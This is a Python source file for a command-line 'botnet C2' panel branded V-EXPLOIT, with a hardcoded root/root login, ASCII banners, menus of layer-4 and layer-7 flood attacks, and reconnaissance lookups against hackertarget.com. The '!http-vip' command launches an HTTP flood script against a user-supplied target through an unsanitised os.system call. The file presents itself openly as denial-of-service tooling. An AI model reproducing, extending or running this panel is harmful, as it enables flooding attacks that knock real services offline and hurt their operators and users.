import os, requests, getpass, raducord, ctypes, sys

proxys = open('proxies.txt').readlines()
bots = len(proxys)

##############################################################################
def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def exit():
    sys.exit(1)

##############################################################################

def m():
    ctypes.windll.kernel32.SetConsoleTitleW(f'🎖️ V-EXPLOIT C2 | NULLSECURITY | BOT [{bots}]')

def ccs():
    print(raducord.Gradient.gradient_text(f'''
    ''',raducord.GradientColors.gold_to_red))
                                          
def home():
    clear()
    print(raducord.Gradient.gradient_text(f'''                                                                 
                                                    @@@  @@@  @@@@@@@  @@@@@@  
                                                    @@!  @@@ !@@      @@   @@@ 
                                                    @!@  !@! !@!        .!!@!  
                                                     !: .:!  :!!       !!:     
                                                       ::     :: :: : :.:: :::
                                     ╔══════════════════════════════════════════════════════╗
                                     ║               BOTNET V-C2 | VERSION BETA             ║
                                     ╚══╦═══════════════════════════════════════════════╦═══╝
                                    ╔═══╩═══════════════════════════════════════════════╩════╗
                                    ║              TYPE [!help] TO OPEN ALL MENU             ║
                                    ╚═════╦═════════════════════════════════════════════╦════╝
                                          ║             CODE BY CEO V-EXPLOIT           ║
                                          ╚═════════════════════════════════════════════╝''',raducord.GradientColors.gold_to_red))

def ban():  
    print(raducord.Gradient.gradient_text(f'''                                          V-EXPLOIT C2 | NULLSECURITY | BOT [{bots}]''', raducord.GradientColors.gold_to_red))

def na(): 
    clear()
    print(raducord.Gradient.gradient_text(f'''                                                                                     
                                         _.oo.
                 _.u[[/;:,.         .odMMMMMM'          
              .o888UU[[[/;:-.  .o@P^    MMM^         WELCOME BACK TO V-C2         
             oN88888UU[[[/;::-.        dP^             BOTS = [{bots}]  
            dNMMNN888UU[[[/;:--.   .o@P^            ╔════════════════════╗  
           ,MMMMMMN888UU[[/;::-. o@^                ║ USER      = admin  ║
           NNMMMNN888UU[[[/~.o@P^                   ║ EXPIRED   = null   ║
           888888888UU[[[/o@^-..                    ╚════════════════════╝
          oI8888UU[[[/o@P^:--..
       .@^  YUU[[[/o@^;::---..
     oMP     ^/o@P^;:::---..
  .dMMM    .o@^ ^;::---...
 dMMMMMMM@^`       `^^^^
YMMMUP^
 ^^''',raducord.GradientColors.gold_to_red))
    
def rules():
    print(raducord.Gradient.gradient_text(f'''
                                          
╔═══(Rules)══>═══════════════════════════════════════════════════════════╗                                                                                     ║                          
║ 1. We strictly prohibit any form of Distributed Denial of              ║
║    Service (DDoS) attacks on domains related to Russia and Palestine.  ║ 
║ 2. Our commitment to ethical conduct and respect                       ║
║    for international boundaries is unwavering.                         ║
║ 3. Respect and integrity are the foundations of our operations.        ║
╚════════════════════════════════════════════════════════════════════════╝''',raducord.GradientColors.gold_to_red))

def menu():
    print(raducord.Gradient.gradient_text(f'''
╔═══(Menu)══>══════╗                                            
║ LAYER7 > !layer7 ║
║ LAYER4 > !layer4 ║                
║ TOOLS  > !tools  ║
║ MENU   > !menu   ║ 
║ HOME   > !home   ║                                                                                                                      
╚══════════════════╝''',raducord.GradientColors.gold_to_red))
    
#############################################################################################

def main():
    m()
    na()
    while True:
        cnc = input(raducord.Gradient.gradient_text(f'''
admin@v-c2~# ''',raducord.GradientColors.gold_to_red))
        if cnc == "!home":
            home()
        elif cnc == "!rules":
            rules()
        elif cnc == "!menu":
            menu()
        elif cnc == "!layer7":
            print(raducord.Gradient.gradient_text(f'''
            !HTTP-KILLER 
            !HTTP-TLS
            !BYPASS-VIP
            !HTTP-VIP
            ''',raducord.GradientColors.gold_to_red))
        elif cnc == "!layer4":
            print(raducord.Gradient.gradient_text(f'''
            !UDP-KILLER <ip> 
            !SSH-KILLER <ip>
            !MCP-KILLER <ip>
            !FVM-KILLER <ip>
            ''',raducord.GradientColors.gold_to_red))
        elif cnc == "!tools":
            print(raducord.Gradient.gradient_text(f'''
            !ge0ip <ip>
            !reverseip <ip>
            !subnet-lookup <cdr/ip + netmask>
            !asn-lookup <ip/asn>
            !dns-lookup <dns>
            !reverse-dns <ip/domain>''',raducord.GradientColors.gold_to_red))
        elif cnc == "!cat":
            print(f'''''')
        elif cnc == "!bots-list":
            print(raducord.Gradient.gradient_text(f'''Total Active : {bots}''',raducord.GradientColors.blue_to_cyan))
        elif "!http-vip" in cnc:
            try:
                target = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node http-vip.js {target} {time} 60 100')
            except IndexError:
                print('Usage: !http-vip <url> <time>')
        elif "!geoip" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/geoip/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: geoip <ip>')
                print('Example: geoip 1.1.1.1')

        elif "!reverseip" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/reverseiplookup/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: reverseip <ip>')
                print('Example: reverseip 1.1.1.1')

        elif "!subnet-lookup" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/subnetcalc/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: subnet-lookup <cdr/ip + netmask>')
                print('Example: subnet-lookup 192.168.1.0/24')

        elif "!asn-lookup" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/aslookup/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: asn-lookup <ip/asn>')
                print('Example: asn-lookup AS15169')

        elif "!dns-lookup" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/dnslookup/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: dns-lookup <dns>')
                print('Example: dns-lookup google.com')

        elif "!reverse-dns" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/reversedns/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: reverse-dns <ip/domain>')
                print('Example: reverse-dns 8.8.8.8')  
        elif "!clear" in cnc:
            clear()
        else:
            try:
                cmmnd = cnc.split()[0]
                print("Command: [ " + cmmnd + " ] Not Found!")
            except IndexError:
                pass
#############################################################################################
def login():
    clear()
    user = "root"
    passwd = "root" 
    username = input(raducord.Gradient.gradient_text("Username: ",raducord.GradientColors.gold_to_red))
    password = getpass.getpass(prompt="Password: ")
    if username != user or password != passwd:
        raducord.Logger.failed("Failed,No Accses,False")
        sys.exit(1)
    elif username == user and password == passwd:
        raducord.Logger.success("Active,Welcome Back to V-Exploit C2,True")
    clear()
    home()
    main()

login()